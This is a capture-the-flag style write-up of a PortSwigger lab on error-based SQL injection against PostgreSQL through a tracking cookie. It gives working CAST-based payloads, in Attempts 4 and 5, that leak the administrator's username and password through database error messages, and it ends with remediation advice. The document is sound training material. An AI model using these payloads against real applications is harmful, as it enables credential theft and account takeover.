# Writeup: Visible Error-Based SQL Injection

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Vulnerability:** SQL Injection (Error-Based)
**Database:** PostgreSQL

---

## Lab Description

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned. The database contains a table called `users` with columns `username` and `password`. The goal is to leak the administrator's password and log in to their account.

---

## Methodology

### 1. Reconnaissance — Finding the Injection Point

Testing the URL parameter by appending a single quote (`'`) did not produce an error — the browser returned:
We’re having trouble finding that site.
This confirmed the URL parameter was not injectable.

### 2. Testing the Cookie Parameter

I intercepted the request using Burp Suite Proxy and forwarded it to the Repeater tab for isolated testing. Appending a single quote (`'`) to the end of the `TrackingId` cookie value returned a `500 Internal Server Error`.

This behavior indicates a SQL injection vulnerability — the backend is accepting and executing raw user input without proper sanitization. If input validation were in place, the application would have returned a `400 Bad Request` instead of crashing internally.

### 3. Database Fingerprinting

The 500 error response returned a verbose error message:
Unterminated string literal started at position 52 in SQL
SELECT * FROM tracking WHERE id = ‘bdrqjKJ0orhEGz4I’’. Expected char

This error syntax is specific to **PostgreSQL**, confirming the database type. It also revealed the full query structure, which is valuable for crafting payloads.

### 4. Data Extraction

**Attempt 1** — Missing `AND` operator:
```sql
CAST((SELECT password FROM users WHERE username='administrator') AS INT)
```
❌ Failed — missing `AND` operator.

**Attempt 2** — Added `AND` but missing boolean condition:
```sql
' AND CAST((SELECT password FROM users WHERE username='administrator') AS INT)
```
❌ Failed — `AND` requires a boolean condition.

**Attempt 3** — Added boolean condition:
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS INT)
```
❌ Failed — payload too long due to existing `TrackingId` value consuming the character limit.

**Fix:** Cleared the existing `TrackingId` value so the full character limit was available for the payload.

**Attempt 4** — Confirmed username using `LIMIT`:
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```
✅ Returned error:
ERROR: invalid input syntax for type integer: “administrator”
This confirmed that the first row of the `users` table contains the username `administrator`.

**Attempt 5** — Extracted password:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```
✅ Returned error:
ERROR: invalid input syntax for type integer: “f0klwan19mwx35k1n731”
**Password found:** `f0klwan19mwx35k1n731`

### 5. Login

Used the extracted credentials to log in as `administrator` and solved the lab.

---

## Why CAST Leaks Data

The `CAST` function attempts to convert the password string to an `INT` data type. Since a string cannot be converted to an integer, PostgreSQL throws a type error — and because verbose error messages are enabled, the actual password value is included in the error response, leaking it directly to the attacker.

---

## Remediation

To fully secure the application against this vulnerability:

1. **Use parameterized queries (prepared statements)** — never concatenate user input directly into SQL queries
2. **Disable verbose error messages in production** — replace raw database errors with generic messages:
“An internal error occurred. Please try again.”
3. **Implement input validation** — reject unexpected characters like single quotes at the application layer
4. **Apply the principle of least privilege** — the database user should only have permissions it absolutely needs

---

## Key Takeaways

- Verbose error messages can leak sensitive database information including passwords
- Cookie parameters are injection points just like URL parameters and form fields
- Character limits on input fields can be bypassed by clearing existing values
- `CAST` type conversion errors in PostgreSQL expose the actual data value in the error message
